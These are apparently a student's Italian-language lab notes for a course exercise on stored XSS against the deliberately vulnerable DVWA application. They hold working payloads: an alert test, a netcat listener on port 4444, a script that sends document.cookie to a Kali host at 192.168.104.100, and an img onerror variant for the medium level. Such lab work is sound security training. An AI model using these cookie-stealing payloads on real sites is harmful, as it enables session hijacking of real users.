# Web Application Exploit XSS 

## Traccia Giorno 2: 

Utilizzando le nozioni viste a lezione, sfruttare la vulnerabilità XSS persistente presente sulla Web Application DVWA al fine simulare il furto di una sessione di un utente lecito del sito, inoltrando i cookie «rubati» ad Web server sotto il vostro controllo. Spiegare il significato dello script utilizzato. 

Requisiti laboratorio Giorno 2: 
Livello difficoltà DVWA: LOW 
IP Kali Linux: 192.168.104.100/24 
IP Metasploitable: 192.168.104.150/24 

I cookie dovranno essere ricevuti su un Web Server in ascolto sulla porta 4444

Extra 

Facoltativi-Replicare tutto a livello medium-fare il dump completo, cookie, versione browser, ip, data-Creare una guida illustrata per spiegare ad un utente medio come replicare questo attacco.


modo normale 

<script>alert(document.coockie)</script>

dopo nel foglio inspect allargo il campo di testo per fare stare il mio script

metto la kali in ascolto
nc -lvnp 4444

script da mettere nel campo di testo della form
<script>
    var cookie = document.cookie;
    var url = "http://192.168.104.100:4444/?" + cookie;
    var img = new Image();
    img.src = url;
</script>


medium
<img src="x" onerror="document.location='http://192.168.104.100:4444/?'+document.cookie">